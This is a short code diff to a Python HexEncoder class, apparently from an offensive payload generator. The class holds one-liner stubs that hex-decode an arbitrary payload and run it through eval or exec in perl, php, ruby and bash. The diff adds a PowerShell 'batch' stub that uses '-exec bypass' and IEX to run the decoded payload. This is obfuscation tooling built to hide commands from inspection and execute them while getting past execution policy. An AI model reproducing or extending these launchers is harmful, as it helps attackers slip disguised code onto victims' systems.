@@ -15,7 +15,10 @@ class HexEncoder(object):
         "perl": "perl -MString::HexConverter -e 'eval print hex_to_ascii(\"{}\");'",
         "php": "php -r '$hexString=\"{}\";exec(hex2bin($hexString));'",
         "ruby": "ruby -e \"eval(\\\"{}\\\".scan(/../).map{{ |x| x.hex.chr }}.join)\"",
-        "bash": "STRING=$(echo \"{}\" | xxd -r -p);eval $STRING;"
+        "bash": "STRING=$(echo \"{}\" | xxd -r -p);eval $STRING;",
+        # same as base64 but with hex
+        "batch": "Powershell.exe -exec bypass IEX "
+                      "(\"{}\"-split\"(..)\"|?{{$_}}|%{{[char][convert]::ToInt16($_,16)}})-join"""
     }
 
     def __init__(self, payload_data, cursor):
@@ -26,7 +29,7 @@ class HexEncoder(object):
 
     def encode(self):
         hexlify = lambda x: "".join([hex(ord(c))[2:].zfill(2) for c in x])
-        acceptable_exec_types = ("powershell", "php", "python", "perl", "ruby", "bash")
+        acceptable_exec_types = ("powershell", "php", "python", "perl", "ruby", "bash", "batch")
         encoded_payload = hexlify(self.payload)
         if self.exec_type in acceptable_exec_types:
             payload = self.payload_starts[self.exec_type]
